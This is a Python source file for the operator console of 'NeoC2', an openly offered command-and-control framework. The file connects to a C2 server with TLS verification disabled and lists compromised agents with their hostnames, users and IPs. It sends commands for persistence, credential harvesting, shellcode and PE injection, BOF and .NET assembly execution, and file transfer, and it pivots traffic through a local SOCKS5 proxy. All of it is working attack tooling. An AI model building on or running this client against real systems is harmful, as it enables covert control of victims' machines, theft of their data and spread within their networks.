#!/usr/bin/env python3

import os
import sys
import socket
import argparse
import json
import ssl
import getpass
import threading
import time
import readline
from datetime import datetime
from pathlib import Path
import select
import signal
import subprocess
import struct
import base64

# Initialize color support
try:
    from rich.console import Console
    from rich.text import Text
    from rich import print as rich_print
    RICH_AVAILABLE = True
    console = Console()
except ImportError:
    RICH_AVAILABLE = False

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORS_ENABLED = True
except ImportError:
    COLORS_ENABLED = False
    class Fore:
        RED = '\033[31m'
        GREEN = '\033[32m'
        YELLOW = '\033[33m'
        BLUE = '\033[34m'
        MAGENTA = '\033[35m'
        CYAN = '\033[36m'
        WHITE = '\033[37m'
        RESET = '\033[0m'

    class Back:
        pass  # Add background colors if needed later

    class Style:
        BRIGHT = '\033[1m'
        DIM = '\033[2m'
        RESET_ALL = '\033[0m'

def colored(text, color_code):
    if COLORS_ENABLED:
        return f"{color_code}{text}{Style.RESET_ALL}"
    return text

def red(text):
    return colored(text, Fore.RED)

def green(text):
    return colored(text, Fore.GREEN)

def yellow(text):
    return colored(text, Fore.YELLOW)

def blue(text):
    return colored(text, Fore.BLUE)

def magenta(text):
    return colored(text, Fore.MAGENTA)

def cyan(text):
    return colored(text, Fore.CYAN)

def bright(text):
    return f"{Style.BRIGHT}{text}{Style.RESET_ALL}" if COLORS_ENABLED else text

class NeoC2RemoteCLI:

    def __init__(self, server_host, server_port, username, password, use_ssl=True):
        self.server_host = server_host
        self.server_port = server_port
        self.username = username
        self.password = password
        self.use_ssl = use_ssl
        self.auth_token = None
        self.connected = False
        self.session_id = None
        self.command_history = []
        self.is_interactive_mode = False
        self.current_agent = None

        try:
            self.COLORS = {
                'success': Fore.GREEN,
                'error': Fore.RED,
                'info': Fore.BLUE,
                'warning': Fore.YELLOW,
                'prompt': Fore.CYAN,
                'reset': Style.RESET_ALL
            }
        except NameError:
            self.COLORS = {
                'success': '',
                'error': '',
                'info': '',
                'warning': '',
                'prompt': '',
                'reset': ''
            }

        self.history_file = os.path.expanduser("~/.neoc2_remote_cli_history")
        if os.path.exists(self.history_file):
            try:
                readline.read_history_file(self.history_file)
            except:
                pass
        readline.set_history_length(1000)

        readline.set_completer_delims(' \t\n')
        readline.parse_and_bind("tab: complete")
        readline.set_completer(self._completer)

        self.socket_lock = threading.Lock()

        self.interactive_command_sent = False
        self.interactive_command_start_time = None

        # For handling agent updates and alerts
        self.active_agents = {}
        self.agent_update_lock = threading.Lock()

        # For periodic agent updates
        self.agent_refresh_thread = None
        self.agent_refresh_stop_event = threading.Event()

        # Queue for handling agent updates without interfering with command responses
        self.agent_update_queue = []
        self.agent_queue_lock = threading.Lock()

        # For tracking command responses and correlating them properly
        self.pending_command_response = None
        self.response_received = threading.Event()

        # For the message receiving thread
        self.receive_thread = None
        self.receive_thread_stop_event = threading.Event()
        self.received_messages = []
        self.received_messages_lock = threading.Lock()

    def _completer(self, text, state):
        commands = [
            'help', 'agent', 'listener', 'modules', 'run', 'pwsh', 'persist', 'pinject', 'peinject', 'encryption',
            'profile', 'protocol', 'stager', 'download', 'upload', 'interactive',
            'exit', 'quit', 'clear', 'status', 'task', 'result', 'save', 'addcmd',
            'harvest', 'execute-bof', 'execute-assembly', 'cmd', 'socks'
        ]

        options = [cmd for cmd in commands if cmd.startswith(text.lower())]

        if state < len(options):
            return options[state]
        else:
            return None

    def connect(self):
        try:
            print(f"{blue('[*]')} Connecting to {self.server_host}:{self.server_port}")

            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            if self.use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE

                self.sock = context.wrap_socket(self.sock, server_hostname=self.server_host)

            self.sock.connect((self.server_host, self.server_port))
            self.connected = True

            print(f"{green('[+]')} Connected to NeoC2 server")

            if self._authenticate():
                print(f"{green('[+]')} Authentication successful")
                return True
            else:
                print(f"{red('[-]')} Authentication failed")
                return False

        except Exception as e:
            print(f"{red('[-]')} Connection error: {str(e)}")
            return False

    def _authenticate(self):
        try:
            auth_data = {
                'type': 'auth',
                'username': self.username,
                'password': self.password,
                'client_type': 'remote_cli'
            }

            self._send_data(auth_data)

            response = self._receive_data()

            if response and response.get('success'):
                self.auth_token = response.get('token')
                self.session_id = response.get('session_id')

                user_info = response.get('user_info', {})
                if user_info:
                    print(f"{green('[+]')} User: {user_info.get('username', 'unknown')}")
                    print(f"{green('[+]')} Role: {user_info.get('role', 'unknown')}")

                # Handle initial agents data from server (if any were active)
                agents = response.get('agents', [])
                if agents:
                    with self.agent_update_lock:
                        for agent in agents:
                            agent_id = agent.get('id')
                            if agent_id:
                                self.active_agents[agent_id] = agent
                    print(f"{green('[+]')} Received {len(agents)} active agents from server")

                return True
            else:
                error_msg = response.get('error', 'Authentication failed')
                print(f"{red('[-]')} Authentication error: {error_msg}")
                return False

        except Exception as e:
            print(f"{red('[-]')} Authentication error: {str(e)}")
            return False

    def _send_data(self, data):
        try:
            json_data = json.dumps(data)
            message = json_data.encode('utf-8')

            length = len(message)
            with self.socket_lock:
                if not self.connected:
                    raise Exception("Socket not connected")
                self.sock.sendall(length.to_bytes(4, byteorder='big'))
                self.sock.sendall(message)

        except Exception as e:
            raise e

    def _receive_data(self):
        try:
            length_bytes = self._receive_exact(4)
            if not length_bytes:
                return None

            length = int.from_bytes(length_bytes, byteorder='big')

            data = self._receive_exact(length)
            if not data:
                return None

            message = json.loads(data.decode('utf-8'))

            return message

        except Exception as e:
            raise e

    def _start_receive_thread(self):
        self.receive_thread_stop_event.clear()
        self.receive_thread = threading.Thread(target=self._message_receive_worker)
        self.receive_thread.daemon = True
        self.receive_thread.start()

    def _stop_receive_thread(self):
        if self.receive_thread_stop_event:
            self.receive_thread_stop_event.set()
        if self.receive_thread and self.receive_thread.is_alive():
            self.receive_thread.join(timeout=1)

    def _message_receive_worker(self):
        while not self.receive_thread_stop_event.is_set():
            try:
                # Check if there's data available to read
                ready, _, _ = select.select([self.sock], [], [], 0.1)  # 0.1 second timeout

                if ready:
                    try:
                        message = self._receive_data()
                        if message:
                            # Add the received message to the message queue
                            with self.received_messages_lock:
                                self.received_messages.append(message)

                            # If it's an agent update, also add to agent update queue for processing
                            if message.get('type') == 'agent_update':
                                with self.agent_queue_lock:
                                    self.agent_update_queue.append(message)
                    except:
                        # Connection might be lost, break the loop
                        break

            except Exception as e:
                # Error in receiving - might indicate connection issue
                break

    def _get_next_message(self):
        with self.received_messages_lock:
            if self.received_messages:
                return self.received_messages.pop(0)
        return None

    def _receive_command_response_with_agent_updates(self):
        start_time = time.time()
        timeout = 60  # 60 second timeout

        while time.time() - start_time < timeout:
            try:
                # First, process any queued agent updates
                self._process_agent_update_queue()

                # Check if we have any messages in the queue
                message = self._get_next_message()
                if message:
                    # If this is an agent update, add to queue and continue waiting for command response
                    if message.get('type') == 'agent_update':
                        with self.agent_queue_lock:
                            self.agent_update_queue.append(message)
                        # Continue waiting for the actual command response
                        continue
                    else:
                        # This is the command response we're looking for
                        return message

                # No message available yet, wait a bit before checking again
                time.sleep(0.01)

            except Exception as e:
                print(f"[-] Error receiving command response: {str(e)}")
                return None

        # Timeout reached
        return None

    def _receive_exact(self, length):
        data = b''
        while len(data) < length:
            with self.socket_lock:
                if not self.connected:
                    return None
                chunk = self.sock.recv(length - len(data))
            if not chunk:
                return None
            data += chunk
        return data

    def send_command(self, command):
        try:
            command_parts = command.strip().split()

            # Check if this is an extension command that needs client-side file lookup
            if command_parts and command_parts[0].lower() in ['execute-bof', 'execute-assembly', 'peinject', 'pwsh', 'pinject']:
                modified_command = self._handle_extension_command(command)
                if modified_command:
                    command_data = {
                        'type': 'command',
                        'command': modified_command,
                        'token': self.auth_token,
                        'session_id': self.session_id
                    }
                else:
                    # If file not found locally, send original command to server for fallback
                    command_data = {
                        'type': 'command',
                        'command': command,
                        'token': self.auth_token,
                        'session_id': self.session_id
                    }
            elif len(command_parts) >= 3 and command_parts[0].lower() == 'profile' and command_parts[1].lower() == 'add':
                profile_file_path = command_parts[2]

                if not profile_file_path.startswith('base64:'):
                    if not os.path.exists(profile_file_path):
                        return {'success': False, 'error': f"Profile file not found: {profile_file_path}"}

                    with open(profile_file_path, 'r') as f:
                        json_content = f.read()

                    import base64
                    encoded_content = base64.b64encode(json_content.encode('utf-8')).decode('utf-8')

                    modified_command = f"profile add base64:{encoded_content}"

                    command_data = {
                        'type': 'command',
                        'command': modified_command,
                        'token': self.auth_token,
                        'session_id': self.session_id
                    }
                else:
                    command_data = {
                        'type': 'command',
                        'command': command,
                        'token': self.auth_token,
                        'session_id': self.session_id
                    }
            else:
                command_data = {
                    'type': 'command',
                    'command': command,
                    'token': self.auth_token,
                    'session_id': self.session_id
                }

            # Show loading animation since module commands in interactive mode still need to wait for results
            loading_stop_event = threading.Event()
            loading_thread = threading.Thread(target=self._show_loading_animation, args=(loading_stop_event,))
            loading_thread.daemon = True
            loading_thread.start()

            if self.is_interactive_mode:
                self.interactive_command_sent = True
                import time
                self.interactive_command_start_time = time.time()

            self._send_data(command_data)

            # Receive response with a timeout to allow processing agent updates in background
            response = self._receive_command_response_with_agent_updates()

            if loading_thread and loading_stop_event:
                loading_stop_event.set()
                loading_thread.join(timeout=0.1)

            return response

        except Exception as e:
            if 'loading_stop_event' in locals():
                loading_stop_event.set()

            print(f"{red('[-]')} Error sending command: {str(e)}")
            self.connected = False
            return None

    def start_socks_proxy(self, local_port=1080):
        """Start a local SOCKS5 proxy that routes traffic through the C2 server"""
        try:
            # Create a socket to listen for SOCKS connections from local tools (like proxychains)
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind(('127.0.0.1', local_port))
            server_socket.listen(5)

            print(f"{green('[+]')} SOCKS5 proxy listening on 127.0.0.1:{local_port}")
            print(f"{green('[+]')} Configure your tools to use socks5://127.0.0.1:{local_port}")

            while True:
                try:
                    client_conn, client_addr = server_socket.accept()
                    print(f"{green('[+]')} New SOCKS client connection from {client_addr}")

                    # Start a thread to handle this SOCKS client
                    client_thread = threading.Thread(
                        target=self._handle_socks_client,
                        args=(client_conn, client_addr),
                        daemon=True
                    )
                    client_thread.start()

                except Exception as e:
                    print(f"{red('[-]')} Error accepting SOCKS connection: {str(e)}")
                    break

        except Exception as e:
            print(f"{red('[-]')} Error starting SOCKS proxy: {str(e)}")
        finally:
            try:
                server_socket.close()
            except:
                pass

    def _handle_socks_client(self, client_conn, client_addr):
        """Handle a SOCKS5 client connection"""
        try:
            # Read the version identifier and number of methods
            header = self._read_exact(client_conn, 2)
            if not header or header[0] != 0x05:
                print(f"{red('[-]')} Invalid SOCKS5 version from {client_addr}")
                client_conn.close()
                return

            n_methods = header[1]
            if n_methods <= 0 or n_methods > 255:
                print(f"{red('[-]')} Invalid number of methods from {client_addr}")
                client_conn.close()
                return

            # Read the methods
            methods = self._read_exact(client_conn, n_methods)
            if not methods:
                client_conn.close()
                return

            # Send no-authentication required response
            client_conn.sendall(b'\x05\x00')

            # Read request header
            request_header = self._read_exact(client_conn, 4)
            if not request_header or request_header[0] != 0x05:
                print(f"{red('[-]')} Invalid SOCKS5 request version from {client_addr}")
                client_conn.close()
                return

            cmd = request_header[1]
            if cmd != 0x01:  # CONNECT command
                # Send error response
                client_conn.sendall(b'\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00')  # Command not supported
                client_conn.close()
                return

            addr_type = request_header[3]

            # Read address and port
            if addr_type == 0x01:  # IPv4
                addr_bytes = self._read_exact(client_conn, 4)
                port_bytes = self._read_exact(client_conn, 2)
                if not addr_bytes or not port_bytes:
                    client_conn.close()
                    return
                addr = socket.inet_ntoa(addr_bytes)
            elif addr_type == 0x03:  # Domain name
                addr_len = ord(self._read_exact(client_conn, 1))
                addr_bytes = self._read_exact(client_conn, addr_len)
                if not addr_bytes:
                    client_conn.close()
                    return
                addr = addr_bytes.decode('utf-8')
                port_bytes = self._read_exact(client_conn, 2)
                if not port_bytes:
                    client_conn.close()
                    return
            elif addr_type == 0x04:  # IPv6
                addr_bytes = self._read_exact(client_conn, 16)
                port_bytes = self._read_exact(client_conn, 2)
                if not addr_bytes or not port_bytes:
                    client_conn.close()
                    return
                addr = socket.inet_ntop(socket.AF_INET6, addr_bytes)
            else:
                # Send error response
                client_conn.sendall(b'\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00')  # Address type not supported
                client_conn.close()
                return

            port = int.from_bytes(port_bytes, 'big')

            # Prepare address (use bracketed IPv6 when necessary)
            if ':' in addr:  # IPv6
                target_addr = f"[{addr}]:{port}"
            else:  # IPv4 or domain
                target_addr = f"{addr}:{port}"

            print(f"{green('[*]')} SOCKS5 connect request to {target_addr}")

            # Send success response - we'll relay to the agent via the C2 channel
            client_conn.sendall(b'\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00')

            # Now we need to relay the connection through the C2 agent
            # This is a simplified version - in a real implementation, we'd need to establish
            # a connection to the agent through the C2 server
            print(f"{green('[+]')} Connected to {target_addr} via C2 channel")

            # Start bidirectional relay between the client and the target
            # In a real implementation, this would involve sending the connection details
            # to the agent and relaying data through the C2 channel
            self._relay_data_through_c2(client_conn, addr, port)

        except Exception as e:
            print(f"{red('[-]')} Error in SOCKS5 handler: {str(e)}")
            try:
                client_conn.close()
            except:
                pass

    def _read_exact(self, sock, length):
        """Read exactly 'length' bytes from socket"""
        data = b''
        while len(data) < length:
            chunk = sock.recv(length - len(data))
            if not chunk:
                return None
            data += chunk
        return data

    def _relay_data_through_c2(self, client_socket, target_addr, target_port):
        """Relay data between client socket and target through C2 channel"""
        try:
            # Create a connection to the C2 server's reverse proxy port (5555)
            # This is where the agent connects back to the C2 server
            c2_host = self.server_host
            c2_port = 5555  # Default reverse proxy port

            # Connect to the C2 server's reverse proxy port
            proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            proxy_socket.connect((c2_host, c2_port))

            # Now relay data between the client and the C2 server's reverse proxy
            def relay(src, dst, name1, name2):
                try:
                    while True:
                        data = src.recv(4096)
                        if not data:
                            break
                        dst.sendall(data)
                except Exception as e:
                    print(f"{red('[-]')} Relay error between {name1} and {name2}: {str(e)}")
                finally:
                    try:
                        src.close()
                    except:
                        pass
                    try:
                        dst.close()
                    except:
                        pass

            # Start two threads for bidirectional relay
            thread1 = threading.Thread(target=relay, args=(client_socket, proxy_socket, "client", "proxy"), daemon=True)
            thread2 = threading.Thread(target=relay, args=(proxy_socket, client_socket, "proxy", "client"), daemon=True)

            thread1.start()
            thread2.start()

            # Wait for threads to complete
            thread1.join()
            thread2.join()

        except Exception as e:
            print(f"{red('[-]')} Error in C2 data relay: {str(e)}")
            try:
                client_socket.close()
            except:
                pass

    def _handle_extension_command(self, command):
        import os
        import base64
        import re

        command_parts = command.strip().split()
        if not command_parts:
            return None

        cmd_name = command_parts[0].lower()
        if len(command_parts) < 2:
            return None  # Not enough arguments

        file_path = command_parts[1]

        # Define file search paths for different extension types
        if cmd_name == 'execute-bof':
            search_paths = [
                os.path.join('modules', 'external', 'bof', file_path),
                os.path.join('modules', 'external', file_path),
                file_path,  # Direct path
                os.path.join(os.getcwd(), file_path),
                os.path.join('modules', 'external', 'bof', os.path.basename(file_path)),
                os.path.join('modules', 'external', os.path.basename(file_path)),
            ]

        elif cmd_name == 'execute-assembly':
            search_paths = [
                os.path.join('modules', 'external', 'assemblies', file_path),
                os.path.join('modules', 'external', file_path),
                file_path,  # Direct path
                os.path.join(os.getcwd(), file_path),
                os.path.join('modules', 'external', 'assemblies', os.path.basename(file_path)),
                os.path.join('modules', 'external', os.path.basename(file_path)),
            ]

        elif cmd_name == 'peinject':
            search_paths = [
                os.path.join('modules', 'external', file_path),
                os.path.join('modules', 'external', 'pe', file_path),
                file_path,  # Direct path
                os.path.join(os.getcwd(), file_path),
                os.path.join('modules', 'external', os.path.basename(file_path)),
                os.path.join('modules', 'external', 'pe', os.path.basename(file_path)),
            ]

        elif cmd_name == 'pwsh':
            # For pwsh, we look for PowerShell script files
            search_paths = [
                os.path.join('modules', 'external', 'powershell', file_path),
                os.path.join('modules', 'external', file_path),
                file_path,  # Direct path
                os.path.join(os.getcwd(), file_path),
                os.path.join('modules', 'external', 'powershell', os.path.basename(file_path)),
                os.path.join('modules', 'external', os.path.basename(file_path)),
            ]

        elif cmd_name == 'pinject':
            # For pinject, we look for shellcode files in the external directory
            search_paths = [
                os.path.join('modules', 'external', file_path),
                os.path.join('modules', 'external', 'shellcode', file_path),
                file_path,  # Direct path
                os.path.join(os.getcwd(), file_path),
                os.path.join('modules', 'external', os.path.basename(file_path)),
                os.path.join('modules', 'external', 'shellcode', os.path.basename(file_path)),
            ]
        else:
            return None

        # Look for the file in the search paths
        found_file_path = None
        for path in search_paths:
            if os.path.exists(path):
                found_file_path = path
                break

        if found_file_path:
            # File found on client side, read and base64 encode it
            try:
                # For pwsh, we need to read as text, not binary
                if cmd_name == 'pwsh':
                    with open(found_file_path, 'r', encoding='utf-8') as f:
                        file_content = f.read().encode('utf-8')  # Convert to bytes for base64 encoding
                    encoded_content = base64.b64encode(file_content).decode('utf-8')
                # For pinject, we read the file content as-is (should be base64 shellcode)
                elif cmd_name == 'pinject':
                    with open(found_file_path, 'r', encoding='utf-8') as f:
                        encoded_content = f.read().strip()  # Read base64 content directly
                else:
                    with open(found_file_path, 'rb') as f:
                        file_content = f.read()
                    encoded_content = base64.b64encode(file_content).decode('utf-8')

                # For peinject, we need to add the 'pe' prefix as the agent expects
                if cmd_name == 'peinject':
                    encoded_content = "pe" + encoded_content

                # Reconstruct the command with the base64 encoded content
                if len(command_parts) > 2:
                    # If there are additional arguments, include them
                    additional_args = ' '.join(command_parts[2:])
                    new_command = f"{cmd_name} {encoded_content} {additional_args}"
                else:
                    new_command = f"{cmd_name} {encoded_content}"

                return new_command
            except Exception as e:
                print(f"{red('[-]')} Error reading file {found_file_path}: {str(e)}")
                return None
        else:
            # File not found on client side, let server handle fallback
            return None

    def print_result(self, message, status):
        if status == 'file_download':
            try:
                import json
                import base64
                file_data = json.loads(message)
                if file_data.get('type') == 'file_download':
                    filename = file_data.get('filename', 'downloaded_file')
                    content = file_data.get('content', '')
                    size = file_data.get('size', 0)

                    file_bytes = base64.b64decode(content.encode('utf-8'))

                    local_path = f"downloaded_{filename}"
                    with open(local_path, 'wb') as f:
                        f.write(file_bytes)

                    print(f"{green('[+]')} File '{filename}' downloaded successfully!")
                    print(f"{green('[+]')} Saved as: {local_path}")
                    print(f"{green('[+]')} Size: {size} bytes")
                else:
                    print(str(message))
            except Exception as e:
                print(f"{red('[-]')} Error processing file download: {str(e)}")
        elif status == 'success':
            print(f"{green('[+]')} {message}" if message.startswith('[+]') else f"{message}")
        elif status == 'error':
            print(f"{red('[-]')} {message}" if message.startswith('[-]') else f"{message}")
        elif status == 'info':
            print(f"{blue('[*]')} {message}" if message.startswith('[*]') else f"{message}")
        elif status == 'warning':
            print(f"{yellow('[!]')} {message}" if message.startswith('[!]') else f"{message}")
        else:
            print(str(message))

    def interactive_mode(self):
        if RICH_AVAILABLE:
            # Keeping ASCII art colored but removed colors from other text
            console.print(f"\n{'=' * 80}")
            console.print(Text(f"""███╗   ██╗███████╗ ██████╗  ██████╗██████╗
████╗  ██║██╔════╝██╔═══██╗██╔════╝╚════██╗
██╔██╗ ██║█████╗  ██║   ██║██║      █████╔╝
██║╚██╗██║██╔══╝  ██║   ██║██║     ██╔═══╝
██║ ╚████║███████╗╚██████╔╝╚██████╗███████╗
╚═╝  ╚═══╝╚══════╝ ╚═════╝  ╚═════╝╚══════╝
                                            """, style="bold green"))
            console.print(f"Neo Remote Command & Control Framework by @stillbigjosh")
            console.print(f"Connected to: {self.server_host}:{self.server_port}")
            console.print(f"User: {self.username}")
            console.print(f"Type 'help' for available commands")
            console.print(f"{'=' * 80}\n")
        else:
            print(f"\n{'=' * 80}")
            print(f"""███╗   ██╗███████╗ ██████╗  ██████╗██████╗
████╗  ██║██╔════╝██╔═══██╗██╔════╝╚════██╗
██╔██╗ ██║█████╗  ██║   ██║██║      █████╔╝
██║╚██╗██║██╔══╝  ██║   ██║██║     ██╔═══╝
██║ ╚████║███████╗╚██████╔╝╚██████╗███████╗
╚═╝  ╚═══╝╚══════╝ ╚═════╝  ╚═════╝╚══════╝
                                            """)
            print(f"Neo Remote Command & Control Framework by @stillbigjosh")
            print(f"Connected to: {self.server_host}:{self.server_port}")
            print(f"User: {self.username}")
            print(f"Type 'help' for available commands")
            print(f"{'=' * 80}\n")

        self._start_agent_refresh_thread()

        self._start_receive_thread()

        try:
            response = self.send_command("agent list")
            if response and response.get('success'):
                result = response.get('result', '')
                if 'No active agents' in result or 'No agents found' in result:
                    pass  # No active agents is fine
                else:
                    pass  # Agents data will be handled by agent update handler
        except:
            pass  # It's ok if this fails

        while self.connected:
            try:
                if self.is_interactive_mode:
                    interactive_result = self._try_receive_interactive_result()
                    while interactive_result:
                        result_text = interactive_result.get('result', '')
                        # Colorize result text based on content patterns
                        if result_text.startswith('[+]'):
                            colored_result = green(result_text)
                        elif result_text.startswith('[-]'):
                            colored_result = red(result_text)
                        elif result_text.startswith('[*]'):
                            colored_result = blue(result_text)
                        elif result_text.startswith('[!]'):
                            colored_result = yellow(result_text)
                        else:
                            colored_result = result_text
                        print(colored_result)

                        self.interactive_command_sent = False
                        self.interactive_command_start_time = None

                        interactive_result = self._try_receive_interactive_result()


                self._process_agent_update_queue()

                if self.is_interactive_mode and self.current_agent:
                    prompt = f"{cyan('NeoC2 [INTERACTIVE:' + self.current_agent[:8] + '] > ')}"
                else:
                    prompt = f"{cyan('NeoC2 (' + self.username + '@remote) > ')}"

                # Show the prompt and get input
                command = input(prompt)
                command = command.strip()

                if not command:
                    continue

                readline.add_history(command)

                if command.lower() in ['exit', 'quit', 'q']:
                    break
                elif command.lower() == 'clear':
                    os.system('clear' if os.name == 'posix' else 'cls')
                    continue
                elif command.lower() == 'help':
                    self._show_help()
                    continue
                elif command.lower().startswith('agent monitor'):
                    self._handle_agent_monitor(command)
                    continue
                elif command.lower().startswith('agent unmonitor'):
                    self._handle_agent_unmonitor(command)
                    continue
                elif command.lower().startswith('socks'):
                    # Handle local SOCKS proxy command
                    parts = command.strip().split()
                    if len(parts) >= 2:
                        try:
                            port = int(parts[1])
                            if 1 <= port <= 65535:
                                print(f"{green('[*]')} Starting local SOCKS5 proxy on port {port}...")
                                print(f"{green('[*]')} Use Ctrl+C to stop the proxy")
                                self.start_socks_proxy(port)
                            else:
                                print(f"{red('[-]')} Port must be between 1 and 65535")
                        except ValueError:
                            print(f"{red('[-]')} Invalid port number: {parts[1]}")
                    else:
                        print(f"{green('[*]')} Starting local SOCKS5 proxy on default port 1080...")
                        print(f"{green('[*]')} Use Ctrl+C to stop the proxy")
                        self.start_socks_proxy(1080)
                    continue

                response = self.send_command(command)

                if response:
                    if response.get('success') is False:
                        self.print_result(f"Error: {response.get('error', 'Unknown error')}", 'error')
                    else:
                        result = response.get('result', 'No result')
                        status = response.get('status', 'info')

                        if status == 'interactive':
                            self.is_interactive_mode = True
                            if 'Agent:' in result:
                                try:
                                    agent_line = [line for line in result.split('\n') if 'Agent:' in line][0]
                                    agent_id = agent_line.split('Agent:')[1].strip()
                                    self.current_agent = agent_id
                                except:
                                    self.current_agent = 'unknown'

                            print(f"{result}")
                        elif status == 'file_download':
                            self.print_result(result, status)
                        elif 'Exited interactive mode' in result or 'exited interactive mode' in result.lower():
                            self.is_interactive_mode = False
                            self.current_agent = None

                            self.print_result(result, status)
                        else:
                            self.print_result(result, status)
                else:
                    self.print_result("No response from server", 'error')
                    if not self.connected:
                        print(f"{red('[-]')} Connection to server lost")
                        break

            except KeyboardInterrupt:
                print(f"\n{yellow('[!]')} Use 'exit' to quit")
            except EOFError:
                break
            except Exception as e:
                print(f"{red('[-]')} Error: {str(e)}")
                break



    def _show_help(self):
        response = self.send_command("help")

        if response:
            if response.get('success') is False:
                self.print_result(f"Error: {response.get('error', 'Failed to retrieve help from server')}", 'error')
            else:
                result = response.get('result', 'No help available from server')
                status = response.get('status', 'info')
                self.print_result(result, status)
        else:
            self.print_result("No response from server while retrieving help", 'error')

    def _handle_agent_monitor(self, command):
        response = self.send_command(command)

        if response:
            if response.get('success') is False:
                self.print_result(f"Error: {response.get('error', 'Unknown error')}", 'error')
            else:
                result = response.get('result', 'No result')
                status = response.get('status', 'info')
                self.print_result(result, status)
        else:
            self.print_result("No response from server", 'error')

    def _handle_agent_unmonitor(self, command):
        response = self.send_command(command)
        if response:
            if response.get('success') is False:
                self.print_result(f"Error: {response.get('error', 'Unknown error')}", 'error')
            else:
                result = response.get('result', 'No result')
                status = response.get('status', 'info')
                self.print_result(result, status)
        else:
            self.print_result("No response from server", 'error')

    def _show_loading_animation(self, stop_event, delay=0.1):
        chars = "/-\\|"
        idx = 0
        while not stop_event.is_set():
            if RICH_AVAILABLE:
                from rich.text import Text
                text = Text()
                text.append(green("[+]"))
                text.append(" Sending command... ")
                text.append(f"{chars[idx % len(chars)]}")

                with console.capture() as capture:
                    console.print(text, end='')
                output = capture.get()

                sys.stdout.write(f"\r{output}")
                sys.stdout.flush()
            else:
                sys.stdout.write(f"\r{green('[+]')} Sending command... {chars[idx % len(chars)]}")
                sys.stdout.flush()
            idx += 1
            time.sleep(delay)
        sys.stdout.write("\r                    \r")
        sys.stdout.flush()

    def _start_interactive_result_listener(self):
        pass

    def _start_agent_refresh_thread(self):
        self.agent_refresh_stop_event.clear()
        self.agent_refresh_thread = threading.Thread(target=self._agent_refresh_worker)
        self.agent_refresh_thread.daemon = True
        self.agent_refresh_thread.start()

    def _stop_agent_refresh_thread(self):
        if self.agent_refresh_stop_event:
            self.agent_refresh_stop_event.set()
        if self.agent_refresh_thread and self.agent_refresh_thread.is_alive():
            self.agent_refresh_thread.join(timeout=1)

    def _process_agent_update_queue(self):
        with self.agent_queue_lock:
            if not self.agent_update_queue:
                return

            queue_copy = self.agent_update_queue[:]
            self.agent_update_queue.clear()

        for message in queue_copy:
            self._handle_agent_update(message)

    def _agent_refresh_worker(self):
        while not self.agent_refresh_stop_event.is_set():
            try:
                self._process_agent_update_queue()

                # Wait for 0.5 seconds before next check (more responsive than 2 seconds)
                if self.agent_refresh_stop_event.wait(timeout=0.5):
                    break  # Stop event was set, exit the loop
            except Exception as e:
                continue  # Continue the loop even if there's an error

    def _stop_interactive_result_listener(self):
        pass

    def _handle_agent_update(self, message):
        agents_data = message.get('agents', [])

        if not agents_data:
            return

        with self.agent_update_lock:
            previous_agent_ids = set(self.active_agents.keys())

            for agent in agents_data:
                agent_id = agent.get('id')
                if agent_id:
                    if agent_id not in self.active_agents:
                        self.display_agent_alert(agent)

                    self.active_agents[agent_id] = agent


    def display_agent_alert(self, agent):
        try:
            alert_msg = f"\n{green('[+]')} NEW AGENT: ID={agent.get('id', 'N/A')} HOST={agent.get('hostname', 'N/A')} USER={agent.get('user', 'N/A')} IP={agent.get('ip_address', 'N/A')} OS={agent.get('os_info', 'N/A')} TIME={datetime.now().strftime('%H:%M:%S')}\n"

            sys.stdout.write(alert_msg)
            sys.stdout.flush()

            sys.stdout.write("\a")  # Terminal bell
            sys.stdout.flush()

        except Exception as e:
            sys.stdout.write(f"{red('[-]')} Error displaying agent alert: {str(e)}\n")
            sys.stdout.flush()

    def _try_receive_interactive_result(self):
        import errno
        try:
            ready, _, _ = select.select([self.sock], [], [], 0)
            if ready:
                response = self._receive_data()
                if response and response.get('type') == 'interactive_result':
                    self.interactive_command_sent = False
                    self.interactive_command_start_time = None
                    return response
        except OSError as e:
            if e.errno == errno.EBADF:
                return None
        except Exception:
            return None
        return None



    def disconnect(self):
        try:
            if self.connected:
                disconnect_data = {
                    'type': 'disconnect',
                    'token': self.auth_token,
                    'session_id': self.session_id
                }
                self._send_data(disconnect_data)

                self.connected = False

                try:
                    readline.write_history_file(self.history_file)
                except:
                    pass

        except:
            pass
        finally:
            # Stop the agent refresh thread
            self._stop_agent_refresh_thread()
            # Stop the receive thread
            self._stop_receive_thread()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--server", required=True, help="Server IP:PORT (e.g., 192.168.1.100:443)")
    parser.add_argument("--username", required=True, help="Username")
    parser.add_argument("--password", help="Password (will prompt if not provided)")
    parser.add_argument("--no-ssl", action="store_true", help="Disable SSL/TLS encryption")

    args = parser.parse_args()

    server_parts = args.server.split(':')
    if len(server_parts) != 2:
        print("Error: Server must be in format IP:PORT")
        sys.exit(1)

    server_host = server_parts[0]
    try:
        server_port = int(server_parts[1])
    except ValueError:
        print("Error: Port must be a number")
        sys.exit(1)

    if not args.password:
        args.password = getpass.getpass("Password: ")

    cli = NeoC2RemoteCLI(
        server_host=server_host,
        server_port=server_port,
        username=args.username,
        password=args.password,
        use_ssl=not args.no_ssl
    )

    if cli.connect():
        try:
            cli.interactive_mode()
        finally:
            cli.disconnect()
            print(f"\n{blue('[*]')} Disconnected from NeoC2 server")
    else:
        sys.exit(1)

if __name__ == "__main__":
    main()
